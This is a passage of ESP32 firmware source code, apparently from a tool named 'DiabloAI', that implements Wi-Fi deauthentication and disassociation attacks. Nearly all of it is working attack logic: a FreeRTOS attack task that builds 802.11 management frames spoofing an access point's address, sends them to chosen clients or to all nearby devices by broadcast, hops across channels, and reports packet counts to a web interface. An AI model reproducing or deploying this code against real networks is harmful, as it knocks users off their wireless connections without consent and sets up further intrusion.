        // Create a FreeRTOS task for the attack to run in the background
        xTaskCreatePinnedToCore(
            attackTask,         // Task function
            "AttackTask",       // Name of task
            4096,               // Stack size (bytes)
            NULL,               // Parameter to pass to function
            5,                  // Priority of task (higher than default)
            &attackTaskHandle,  // Task handle
            0                   // Core to run on (0 for WiFi tasks)
        );
        xSemaphoreGive(xAttackControlMutex);
    }
    sendAttackStatusToClients();
}

void stopAttack() {
    if (xSemaphoreTake(xAttackControlMutex, portMAX_DELAY) == pdTRUE) {
        if (isAttacking) {
            isAttacking = false;
            if (attackTaskHandle != NULL) {
                vTaskDelete(attackTaskHandle); // Terminate the attack task
                attackTaskHandle = NULL;
                Serial.println("[DiabloAI] Attack task deleted.");
            }
            Serial.println("[DiabloAI] Attack stopped.");
        } else {
            Serial.println("[DiabloAI] No attack currently active.");
        }
        currentAttackType = ATTACK_TYPE_NONE;
        // Reset target MACs to all zeros to indicate no specific target
        memset(currentTargetMac.bytes, 0, 6);
        memset(currentTargetApBssid.bytes, 0, 6);
        currentAttackChannel = 0;
        isChannelHopping = false;
        packetsSent = 0;
        xSemaphoreGive(xAttackControlMutex);
    }
    sendAttackStatusToClients();
}

// --- Attack Task (runs in a separate FreeRTOS task) ---
void attackTask(void *pvParameters) {
    uint8_t currentChannel = 0;
    unsigned long lastChannelHopTime = 0;
    const unsigned long CHANNEL_HOP_INTERVAL_MS = 200; // Hop channels every 200ms when hopping
    const unsigned long PACKET_SEND_DELAY_MS = 10; // Delay between sending individual packets

    // Get initial channel from UI selection or current scan channel
    if (xSemaphoreTake(xAttackControlMutex, portMAX_DELAY) == pdTRUE) {
        if (currentAttackChannel != 0) { // If a specific channel is selected from UI
            currentChannel = currentAttackChannel;
        } else { // Auto channel (use current promiscuous mode channel)
            wifi_second_chan_t second_channel;
            esp_wifi_get_channel(&currentChannel, &second_channel);
            if (currentChannel == 0) currentChannel = 1; // Default to 1 if not set
        }
        xSemaphoreGive(xAttackControlMutex);
    }

    // Set the WiFi channel for the attack task
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[DiabloAI] Attack task started on channel %d.\n", currentChannel);

    while (true) {
        // Check if attack should stop
        if (xSemaphoreTake(xAttackControlMutex, (TickType_t)10) == pdTRUE) { // Try to take mutex, don't block for long
            if (!isAttacking) {
                xSemaphoreGive(xAttackControlMutex);
                break; // Exit task if attack is stopped
            }

            // Channel hopping logic
            if (isChannelHopping && (millis() - lastChannelHopTime > CHANNEL_HOP_INTERVAL_MS)) {
                currentChannel = (currentChannel % 14) + 1; // Cycle through channels 1-14
                esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
                Serial.printf("[DiabloAI] Hopping to channel %d\n", currentChannel);
                lastChannelHopTime = millis();
                sendAttackStatusToClients(); // Update UI with new channel
            }

            // Ensure we are on the correct fixed channel if not hopping
            if (!isChannelHopping && currentAttackChannel != 0 && currentChannel != currentAttackChannel) {
                currentChannel = currentAttackChannel;
                esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
                Serial.printf("[DiabloAI] Setting fixed attack channel to %d\n", currentChannel);
                sendAttackStatusToClients(); // Update UI with new channel
            }

            MacAddress targetMac = currentTargetMac;
            MacAddress targetApBssid = currentTargetApBssid;
            int attackType = currentAttackType;

            xSemaphoreGive(xAttackControlMutex); // Release mutex before sending packets

            // Send the appropriate frame
            if (attackType == ATTACK_TYPE_DEAUTH) {
                sendDeauthFrame(targetMac, targetApBssid, currentChannel, REASON_UNSPECIFIED);
            } else if (attackType == ATTACK_TYPE_DISASSOC) {
                sendDisassocFrame(targetMac, targetApBssid, currentChannel, REASON_UNSPECIFIED);
            }

            // Update packets sent counter (protected by mutex)
            if (xSemaphoreTake(xAttackControlMutex, (TickType_t)10) == pdTRUE) {
                packetsSent++;
                xSemaphoreGive(xAttackControlMutex);
            }
            // Send status updates less frequently to avoid overwhelming WebSocket
            if (packetsSent % 10 == 0) { // Update UI every 10 packets
                sendAttackStatusToClients();
            }

            vTaskDelay(PACKET_SEND_DELAY_MS / portTICK_PERIOD_MS); // Delay between packets
        } else {
            vTaskDelay(1 / portTICK_PERIOD_MS); // If mutex contention, yield briefly
        }
    }
    Serial.println("[DiabloAI] Attack task terminated.");
    vTaskDelete(NULL); // Delete the task
}

// --- Send Deauthentication Frame ---
void sendDeauthFrame(MacAddress targetMac, MacAddress apMac, uint8_t channel, uint16_t reasonCode) {
    // 802.11 Deauthentication Frame Structure
    // Frame Control: C0 00 (Type=Management, Subtype=Deauthentication)
    // Duration: 00 00 (set by hardware)
    // DA (Destination Address): Target Client MAC or Broadcast FF:FF:FF:FF:FF:FF
    // SA (Source Address): AP MAC (BSSID)
    // BSSID: AP MAC
    // Sequence Control: 00 00 (set by hardware)
    // Reason Code: 00 01 (Unspecified)

    uint8_t deauthFrame[] = {
        0xC0, 0x00, // Frame Control (Type: Management, Subtype: Deauthentication)
        0x00, 0x00, // Duration (filled by hardware)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination Address (DA)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (SA)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00, // Sequence Control (filled by hardware)
        (uint8_t)(reasonCode & 0xFF), (uint8_t)(reasonCode >> 8) // Reason Code
    };

    // Set Destination Address (DA)
    // If targetMac is all zeros, it means broadcast (FF:FF:FF:FF:FF:FF) for "All Nearby"
    if (targetMac.bytes[0] == 0 && targetMac.bytes[1] == 0 && targetMac.bytes[2] == 0 &&
        targetMac.bytes[3] == 0 && targetMac.bytes[4] == 0 && targetMac.bytes[5] == 0) {
        memset(&deauthFrame[4], 0xFF, 6); // Set DA to Broadcast
    } else {
        memcpy(&deauthFrame[4], targetMac.bytes, 6); // Set DA to specific target MAC
    }

    // Set Source Address (SA) and BSSID to the AP's MAC
    memcpy(&deauthFrame[10], apMac.bytes, 6); // SA is AP MAC
    memcpy(&deauthFrame[16], apMac.bytes, 6); // BSSID is AP MAC

    // Send the raw 802.11 frame using esp_wifi_80211_tx
    // WIFI_IF_AP is used because the ESP32 is acting as an AP for the web server,
    // and this interface can be used for raw frame injection.
    // The 'true' argument indicates that the frame includes the FCS (Frame Check Sequence),
    // which the hardware will calculate and append.
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), true);
    if (err != ESP_OK) {
        // Serial.printf("[DiabloAI] Deauth frame TX failed: %d\n", err); // Uncomment for verbose debugging
    } else {
        // Serial.printf("[DiabloAI] Deauth frame sent to %s from %s on channel %d\n",
        //               targetMac.toString().c_str(), apMac.toString().c_str(), channel); // Uncomment for verbose debugging
    }
}

// --- Send Disassociation Frame ---
void sendDisassocFrame(MacAddress targetMac, MacAddress apMac, uint8_t channel, uint16_t reasonCode) {
    // 802.11 Disassociation Frame Structure (similar to Deauthentication)
    // Frame Control: A0 00 (Type=Management, Subtype=Disassociation)

    uint8_t disassocFrame[] = {
        0xA0, 0x00, // Frame Control (Type: Management, Subtype: Disassociation)
        0x00, 0x00, // Duration (filled by hardware)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination Address (DA)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (SA)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00, // Sequence Control (filled by hardware)
        (uint8_t)(reasonCode & 0xFF), (uint8_t)(reasonCode >> 8) // Reason Code
    };

    // Set Destination Address (DA)
    // If targetMac is all zeros, it means broadcast (FF:FF:FF:FF:FF:FF) for "All Nearby"
    if (targetMac.bytes[0] == 0 && targetMac.bytes[1] == 0 && targetMac.bytes[2] == 0 &&
        targetMac.bytes[3] == 0 && targetMac.bytes[4] == 0 && targetMac.bytes[5] == 0) {
        memset(&disassocFrame[4], 0xFF, 6); // Set DA to Broadcast
    } else {
        memcpy(&disassocFrame[4], targetMac.bytes, 6); // Set DA to specific target MAC
    }

    // Set Source Address (SA) and BSSID to the AP's MAC
    memcpy(&disassocFrame[10], apMac.bytes, 6); // SA is AP MAC
    memcpy(&disassocFrame[16], apMac.bytes, 6); // BSSID is AP MAC

    // Send the raw 802.11 frame
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, disassocFrame, sizeof(disassocFrame), true);
    if (err != ESP_OK) {
        // Serial.printf("[DiabloAI] Disassoc frame TX failed: %d\n", err); // Uncomment for verbose debugging
    } else {
        // Serial.printf("[DiabloAI] Disassoc frame sent to %s from %s on channel %d\n",
        //               targetMac.toString().c_str(), apMac.toString().c_str(), channel); // Uncomment for verbose debugging
    }
}

// --- Utility Functions ---
// Converts a MAC address string (e.g., "AA:BB:CC:DD:EE:FF") to a byte array
void stringToMac(const String& macStr, uint8_t* macBytes) {
    if (macStr.length() == 17) { // Check for valid MAC string length
        sscanf(macStr.c_str(), "%hhX:%hhX:%hhX:%hhX:%hhX:%hhX",
               &macBytes[0], &macBytes[1], &macBytes[2],
               &macBytes[3], &macBytes[4], &macBytes[5]);
    } else {
        // If string is invalid, set MAC to all zeros (effectively a null/broadcast equivalent for internal logic)
        memset(macBytes, 0, 6);
    }
}

// Converts WiFi authentication mode enum to a human-readable string
String getEncryptionType(wifi_auth_mode_t authMode) {
    switch (authMode) {
        case WIFI_AUTH_OPEN: return "OPEN";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA_PSK";
        case WIFI_AUTH_WPA2_PSK: return "WPA2_PSK";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA_WPA2_PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2_ENTERPRISE";
        case WIFI_AUTH_WPA3_PSK: return "WPA3_PSK";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2_WPA3_PSK";
        default: return "UNKNOWN";
    }
}

// Provides channel band information (ESP32-WROOM-32D is 2.4GHz only)
String getChannelBand(uint8_t channel) {
    if (channel >= 1 && channel <= 14) {
        return "2.4GHz";
    }
    return "Unknown";
}

